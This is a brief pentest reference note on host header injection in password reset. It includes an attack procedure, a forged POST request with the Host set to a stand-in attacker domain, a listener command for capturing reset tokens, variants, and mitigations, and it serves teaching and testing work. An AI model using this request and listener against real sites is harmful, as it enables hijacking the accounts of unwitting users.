---
topic: Host header injection in password reset
tags: [web, host-header, password-reset, cache]
---

# Host header injection in password reset

[🌐 Español](host-header-password-reset.md) | **English**

## Concept

If an application builds the reset link from the `Host` header, an attacker can send the request with their own domain. The victim receives a valid link pointing to the attacker, who captures the token.

## When it applies

- The reset form sends an email with a link.
- The link domain is not fixed in configuration.
- The application accepts an arbitrary `Host`.

## Procedure

1. Request the reset with `Host: <ATTACKER>`.
2. Listen for the victim's request.
3. Extract the token and use it.
4. Change the password and log in.

```http
POST /forgot HTTP/1.1
Host: <ATTACKER>
Content-Type: application/x-www-form-urlencoded

username=victim
```

```bash
python3 -m http.server 80
```

## Variants

- Add `X-Forwarded-Host` if `Host` is validated.
- Poison the cache to serve the victim's session.
- Combine with a domain resolving to the attacker.

## Limitations

- The application must use the header.
- The email must reach a real victim.
- The token must remain valid.

## Mitigation and detection

- Fix the reset domain in configuration.
- Validate `Host` against an allowlist.
- Do not cache authenticated responses.

## References

- <https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection>
- <https://portswigger.net/web-security/host-header>
- <https://attack.mitre.org/techniques/T1556/>
